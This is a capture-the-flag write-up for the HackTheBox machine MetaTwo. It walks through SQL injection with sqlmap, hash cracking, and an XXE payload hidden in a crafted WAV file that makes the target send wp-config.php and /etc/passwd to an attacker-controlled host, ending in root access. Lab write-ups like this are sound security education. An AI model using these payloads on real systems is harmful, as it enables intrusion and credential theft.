# MetaTwo

Date Released: 31st October 2022

Date Completed: 7th November 2022

This was actually my first time posting a CTF write-up. Since it was still an active machine at the moment so I thought of posting a write-up incase anyone needs it.

I always start off by setting the environment variable `$IP` to the target's IP address. This was actually inspired by [John Hammond](https://www.youtube.com/c/JohnHammond010) as he always do that in his youtube videos.

```console
export IP=10.10.11.186
```
Then I added `metatwo.htb` with the target IP address into `/etc/hosts`, mapping the domain name to the IP address.

For the initial recon, I scanned using nmap with the following flags:
```console
nmap -sC -sV -T4 -A $IP -vv -oN nmap/usual

[REDACTED]
21/tcp open  ftp?    syn-ack
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0
```
So far I only found 3 TCP ports open. But continued to scan for all ports incase there are any other open ports that I may miss.
```console
sudo nmap -sS -T5 -n -p- $IP -vv -oN nmap/full

[REDACTED
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
But there were no additional ports open.

Next I visited the website running on port 80, but whenever I access `http://metatwo.htb`, I got redirected to `http://metapress.htb`.

So I added `metapress.htb` to `/etc/hosts`.

The first thing I noticed is that it is a **WordPress** site.

So I performed a scan using **wpscan** on `http://metapress.htb`:
```console
wpscan --url metapress.htb --enumerate p,u --plugins-detection aggressive --detection-mode aggressive -o wpscan/metapress.htb
```
Output:
```console
[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
```
Keep in mind these are some information that may come in handy later.

I continued to explore the website, there was only 1 blog posts, which leads to `http://metapress.htb/events`, where I can book for appointments. I played around it with my proxy (burp) running as I observe the requests.

In the process of booking an appointment, there are several **POST** requests made `/wp-admin/admin-ajax.php`. I then used sqlmap with the requests to find out if there is any SQL Injection vulnerability.

After playing around to find for entry points, I managed to find a **Blind (Time Based) SQL Injection** vulnerability.

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1060
Origin: http://metapress.htb
Connection: close
Referer: http://metapress.htb/events/
Cookie: PHPSESSID=428v452laaim1ff540t4l87q4i

action=bookingpress_front_save_appointment_booking&appointment_data%5Bselected_category%5D=1&appointment_data%5Bselected_cat_name%5D=&appointment_data%5Bselected_service%5D=1&appointment_data%5Bselected_service_name%5D=Startup%20meeting&appointment_data%5Bselected_service_price%5D=%240.00&appointment_data%5Bservice_price_without_currency%5D=0&appointment_data%5Bselected_date%5D=2022-11-07&appointment_data%5Bselected_start_time%5D=00%3A00&appointment_data%5Bselected_end_time%5D=00%3A30&appointment_data%5Bcustomer_name%5D=&appointment_data%5Bcustomer_firstname%5D=Lai&appointment_data%5Bcustomer_lastname%5D=Zhen&appointment_data%5Bcustomer_phone%5D=011-2124%204556&appointment_data%5Bcustomer_email%5D=123%40mail.com&appointment_data%5Bappointment_note%5D=%3Cimg%20src%3D%22http%3A%2F%2F10.10.14.9%2Fxss%22%3E%0A123&appointment_data%5Bselected_payment_method%5D=&appointment_data%5Bcustomer_phone_country%5D=MY&appointment_data%5Btotal_services%5D=&appointment_data%5Bstime%5D=1667807075&appointment_data%5Bspam_captcha%5D=O3cuqAvmZ2uR&_wpnonce=60646b11e1
```

I used the following command to dump the details of the users in the WordPress's database. I took quite a while since it was a time-based attack.
```console
sqlmap -r appointment_json.req -D blog -T wp_users --dump
```

I managed to find the hashes of 2 user accounts.
```
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

I saved the hashes to `hashes.txt` bruteforced the password using JohnTheRipper with `rockyou.txt`.

```console
john -w=/usr/share/wordlists/rockyou.txt

[REDACTED]
partylikearockstar		(manager)
```

I was only able to get `manager`'s password.

Next I used the credentials to log in at `/wp-login.php`.

Im in, but I don't have admin privileges.

But I am able to upload media.

So I quickly searched for wordpress 5.6.2 vulnerabilities and it lead me to [a list of vulnerabilities](https://www.acunetix.com/vulnerabilities/web/wordpress-5-6-x-multiple-vulnerabilities-5-6-5-6-2/).

Which then again lead me to [this exploit](https://github.com/motikan2010/CVE-2021-29447).

I cloned the repository and followed the steps in it.

First, I started my attacker server
```bash
make up-mal
```

Change the IP & port (to my host) in `/attacker/www/evil.dtd`

```dtd
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.9:8001/?p=%file;'>" >     <-- CHANGE HERE
```

Generate the Payload using:  (remember to change the IP & port too!)
```console
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.9:8001/evil.dtd'"'"'>%remote;%init;%trick;] >\x00'> malicious.wav    <-- CHANGE HERE
```

Now I have the payload `malicious.wav`

Upload it to the media library using the `manager` account

On my attacker server:
```console
[Mon Nov  7 02:13:24 2022] 10.10.11.186:45186 [200]: GET /evil.dtd
[Mon Nov  7 02:13:24 2022] 10.10.11.186:45186 Closing
[Mon Nov  7 02:13:24 2022] 10.10.11.186:45188 Accepted
[Mon Nov  7 02:13:24 2022] 10.10.11.186:45188 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory
```
I got a reponse, but it is not readable yet.

Then I modified `attacker/decryption.php` and executed it to decode the data:
```
<?php
echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=='));
```
Executing the script:
```console
php attacker/decryption.php
```
Output:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```
LFI achieved! From here we can see there's a user called `jnelson`.

Next step is to figure out what file should I read to gain control.

Normally in WordPress sites, `wp-config.php` is the file that contains credentials of other services that the web server connects to.

To read `wp-config.php`, I modified `attacker/www/evil.dtd` and uploaded the payload again to view the response.
```dtd
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php">    <-- Change Here
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://10.10.14.9:8001/?p=%file;'>" >
```
The payload triggered and after decoding, I was able to read `wp-config.php`:
```
[REDACTED]
MYSQL
define( 'DB_NAME', 'blog' );
define( 'DB_USER', 'blog' );
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

[REDACTED]

FTP
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
[REDACTED]
```

The MySQL service was not exposed to us (Nmap scan did not discover port 3306).

So I FTP into ftp.metapress.htb using the credentials
```
metapress.htb:9NYS_ii@FyL_p5M2NvJ
```

In the FTP server, there were 2 directories
> blog - The WordPress site directory
> 
> mailer - Directory of MailerPHP framework

I was thinking of uploading a reverse shell file to the WordPress site, but I was not allowed to upload files.

Then I browsed through each file in the FTP server to find for useful information.

Eventually, I found some credentials in `mailer/send_mail.php`:
```
[REDACTED]
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587; 
```

There was no mail-related service (pop3, smtp) exposed to us either, the only option left is **SSH**.

So I tried to ssh into jnelson using his SMTP password

### Got shell as `jnelson@meta2`

Got `user.txt` at `/home/jnelson`.

Next, I found some interesting files at `/home/jnelson/.passpie`.
```
.config  <-- useless file
.keys  <-- **contains PGP private & public keys**
ssh/
	jnelson.pass  <-- PGP encrypted message
	root.pass  <-- PGP encrypted message
```

I saved the public & private keys to my box as `public_key` & `private_key` and imported them into `gpg`.
```console
gpg --import public_key
gpg --import private_key
```

Importing public_key was successful, but it prompts for a password when I import private_key.

So I try to bruteforce using `JohnTheRipper` with `rockyou.txt`, but before that I have to convert it into john readable format.
```console
pgp2john private_key > forjohn

john -w=/usr/share/wordlists/rockyou.txt forjohn

[REDACTED]
blink182         (Passpie) 
```
Now I have the password for the private key, so I continued importing it.
```console
gpg --import private_key
```

Then I proceed to decrypt those 2 PGP messages: `jnelson.pass` and `root.pass`.
```console
gpg -d jnelson.pass
gpg: encrypted with 1024-bit ELG key, ID A23EC25F8B5D831A, created 2022-06-26
      "Passpie (Auto-generated by Passpie) <passpie@local>"
Cb4_JmWM8zUZWMu@Ys
```
And it was the password of the user `jnelson` that we've found earlier

```console
gpg -d root.pass
gpg: encrypted with 1024-bit ELG key, ID A23EC25F8B5D831A, created 2022-06-26
      "Passpie (Auto-generated by Passpie) <passpie@local>"
p7qfAZt4_A1xo_0x
```
So root's password is **`p7qfAZt4_A1xo_0x`**

Now we can su to root.

```console
su root
Password: p7qfAZt4_A1xo_0x
```

### Got shell as `root@meta2`

Got `root.txt` at `/root`!

# Done!

That's all for this write-up. Hope you didn't have any trouble understanding my writings. XD
